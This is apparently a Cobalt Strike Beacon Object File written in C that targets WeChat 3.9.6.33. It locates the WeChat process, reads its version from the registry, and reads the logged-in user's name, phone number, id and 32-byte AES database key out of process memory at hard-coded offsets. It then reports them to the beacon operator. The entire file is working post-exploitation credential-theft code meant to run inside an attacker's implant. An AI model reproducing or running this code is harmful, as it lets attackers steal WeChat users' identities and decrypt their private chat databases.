#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"


#define TH32_SNAPSHOT_FLAGS (TH32CS_SNAPMODULE | TH32CS_SNAPPROCESS)
#define PROCESS_SNAPSHOT_FLAGS TH32CS_SNAPPROCESS

typedef HANDLE(WINAPI *PFN_CreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL(WINAPI *PFN_Module32First)(HANDLE, LPMODULEENTRY32);
typedef BOOL(WINAPI *PFN_Module32Next)(HANDLE, LPMODULEENTRY32);
typedef HMODULE(WINAPI *PFN_LoadLibrary)(LPCSTR);
typedef FARPROC(WINAPI *PFN_GetProcAddress)(HMODULE, LPCSTR);
typedef BOOL(WINAPI *PFN_FreeLibrary)(HMODULE);
typedef BOOL(WINAPI *PFN_CloseHandle)(HANDLE);
typedef BOOL(WINAPI *PFN_Process32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI *PFN_Process32Next)(HANDLE, LPPROCESSENTRY32);
typedef HANDLE(WINAPI *PFN_OpenProcess)(DWORD, BOOL, DWORD);
typedef BOOL(WINAPI *PFN_ReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);

typedef PCSTR(WINAPI *PFN_StrStrIA)(PCSTR, PCSTR);

PFN_CreateToolhelp32Snapshot pfnCreateToolhelp32Snapshot;
PFN_Module32First pfnModule32First;
PFN_Module32Next pfnModule32Next;
PFN_LoadLibrary pfnLoadLibrary;
PFN_GetProcAddress pfnGetProcAddress;
PFN_FreeLibrary pfnFreeLibrary;
PFN_CloseHandle pfnCloseHandle;
PFN_Process32First pfnProcess32First;
PFN_Process32Next pfnProcess32Next;
PFN_OpenProcess pfnOpenProcess;
PFN_ReadProcessMemory pfnReadProcessMemory;


void initializeAPIs() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    pfnCreateToolhelp32Snapshot = (PFN_CreateToolhelp32Snapshot)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
    pfnModule32First = (PFN_Module32First)GetProcAddress(hKernel32, "Module32First");
    pfnModule32Next = (PFN_Module32Next)GetProcAddress(hKernel32, "Module32Next");
    pfnLoadLibrary = (PFN_LoadLibrary)GetProcAddress(hKernel32, "LoadLibraryA");
    pfnGetProcAddress = (PFN_GetProcAddress)GetProcAddress(hKernel32, "GetProcAddress");
    pfnFreeLibrary = (PFN_FreeLibrary)GetProcAddress(hKernel32, "FreeLibrary");
    pfnCloseHandle = (PFN_CloseHandle)GetProcAddress(hKernel32, "CloseHandle");
    pfnProcess32First = (PFN_Process32First)GetProcAddress(hKernel32, "Process32First");
    pfnProcess32Next = (PFN_Process32Next)GetProcAddress(hKernel32, "Process32Next");
    pfnOpenProcess = (PFN_OpenProcess)GetProcAddress(hKernel32, "OpenProcess");
    pfnReadProcessMemory = (PFN_ReadProcessMemory)GetProcAddress(hKernel32, "ReadProcessMemory");
}

DWORD_PTR GetModuleBaseAddress(DWORD procId, const char* modName) {
    HANDLE hSnap = pfnCreateToolhelp32Snapshot(TH32_SNAPSHOT_FLAGS, procId);
    MODULEENTRY32 modEntry = {.dwSize = sizeof(modEntry)};

    PFN_StrStrIA pfnStrStrIA;
    HMODULE hModule = pfnLoadLibrary("shlwapi.dll");
    if (hModule) {
        pfnStrStrIA = (PFN_StrStrIA)pfnGetProcAddress(hModule, "StrStrIA");
    }

    if (hSnap != INVALID_HANDLE_VALUE && pfnModule32First(hSnap, &modEntry) && pfnStrStrIA) {
        do {
            if (pfnStrStrIA(modEntry.szModule, modName)) {
                pfnFreeLibrary(hModule);
                pfnCloseHandle(hSnap);
                return (DWORD_PTR)modEntry.modBaseAddr;
            }
        } while (pfnModule32Next(hSnap, &modEntry));
    }

    pfnFreeLibrary(hModule);
    pfnCloseHandle(hSnap);
    return 0;
}


DWORD GetProcId(const char* procName) {
    HANDLE hSnap = pfnCreateToolhelp32Snapshot(PROCESS_SNAPSHOT_FLAGS, 0);
    PROCESSENTRY32 procEntry = {.dwSize = sizeof(procEntry)};

    PFN_StrStrIA pfnStrStrIA;
    HMODULE hModule = pfnLoadLibrary("shlwapi.dll");
    if (hModule) {
        pfnStrStrIA = (PFN_StrStrIA)pfnGetProcAddress(hModule, "StrStrIA");
    }

    if (hSnap != INVALID_HANDLE_VALUE && pfnProcess32First(hSnap, &procEntry) && pfnStrStrIA) {
        do {
            if (pfnStrStrIA(procEntry.szExeFile, procName)) {
                pfnFreeLibrary(hModule);
                pfnCloseHandle(hSnap);
                return procEntry.th32ProcessID;
            }
        } while (pfnProcess32Next(hSnap, &procEntry));
    }

    pfnFreeLibrary(hModule);
    pfnCloseHandle(hSnap);
    return 0;
}

typedef HKEY(WINAPI *pRegOpenKeyExA)(HKEY, LPCTSTR, DWORD, REGSAM, PHKEY);
typedef LONG(WINAPI *pRegQueryValueExA)(HKEY, LPCTSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LONG(WINAPI *pRegCloseKey)(HKEY);

void GetWxVersion(){
    pRegOpenKeyExA RegOpenKeyExAPtr;
    pRegQueryValueExA RegQueryValueExAPtr;
    pRegCloseKey RegCloseKeyPtr;
    HKEY hKey;
    DWORD version;

    RegOpenKeyExAPtr = (pRegOpenKeyExA)GetProcAddress(LoadLibraryA("advapi32.dll"), "RegOpenKeyExA");
    RegQueryValueExAPtr = (pRegQueryValueExA)GetProcAddress(LoadLibraryA("advapi32.dll"), "RegQueryValueExA");
    RegCloseKeyPtr = (pRegCloseKey)GetProcAddress(LoadLibraryA("advapi32.dll"), "RegCloseKey");

    if (!RegOpenKeyExAPtr || !RegQueryValueExAPtr || !RegCloseKeyPtr) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to resolve functions.");
        return;
    }

    if (RegOpenKeyExAPtr(HKEY_CURRENT_USER, "SOFTWARE\\Tencent\\WeChat", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD dwType = REG_DWORD;
        DWORD dwSize = sizeof(DWORD);
        if (RegQueryValueExAPtr(hKey, "Version", NULL, &dwType, (LPBYTE)&version, &dwSize) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "WeChat version: %d.%d.%d.%d",
                         ((version & 0xFF000000) >> 24) - 96,
                         (version & 0x00FF0000) >> 16,
                         (version & 0x0000FF00) >> 8,
                         version & 0x000000FF);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "Cannot get version.");
        }
        RegCloseKeyPtr(hKey);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Cannot open the registry key of WeChat.");
    }
}

void byteToHexStr(BYTE byte, char *output) {
    char hexChars[] = "0123456789abcdef";
    output[0] = hexChars[(byte >> 4) & 0x0F];
    output[1] = hexChars[byte & 0x0F];
}

void go(IN PCHAR Buffer, IN ULONG Length) {
    BeaconPrintf(CALLBACK_OUTPUT, "this is a test , only version 3.9.6.33 is supported\n");
    GetWxVersion();
    initializeAPIs();
    DWORD procId = GetProcId("WeChat.exe");
    if (!procId) {
        BeaconPrintf(CALLBACK_OUTPUT, "Process not found.");
    }

    HANDLE hProcess = pfnOpenProcess(PROCESS_VM_READ, FALSE, procId);
    if (!hProcess) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to open the process.");
    }

    DWORD_PTR moduleBase = GetModuleBaseAddress(procId, "WeChatWin.dll");
    if (!moduleBase) {
        BeaconPrintf(CALLBACK_OUTPUT, "Module not found.");
        pfnCloseHandle(hProcess);
    }
    char name[256], phone[256], id[256];
    BYTE aeskey[32];
    DWORD_PTR key_addr;

    pfnReadProcessMemory(hProcess, (LPCVOID)(moduleBase + 0x3B28308), name, sizeof(name), NULL);
    pfnReadProcessMemory(hProcess, (LPCVOID)(moduleBase + 0x3B28248), phone, sizeof(phone), NULL);
    pfnReadProcessMemory(hProcess, (LPCVOID)(moduleBase + 0x3B28840), id, sizeof(id), NULL);
    pfnReadProcessMemory(hProcess, (LPCVOID)(moduleBase + 0x3B28800), &key_addr, sizeof(key_addr), NULL);
    pfnReadProcessMemory(hProcess, (LPCVOID)key_addr, aeskey, sizeof(aeskey), NULL);

    char aeskeyStr[65] = { 0 };
    for (int i = 0; i < 32; i++) {
        byteToHexStr(aeskey[i], &aeskeyStr[i*2]);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Module base address: 0x%llx\nAES Key address: 0x%llx\nName: %s\nid: %s\nPhone: %s\nAES Key: %s\n", moduleBase, key_addr, name,id ,phone,aeskeyStr);
    pfnCloseHandle(hProcess);
}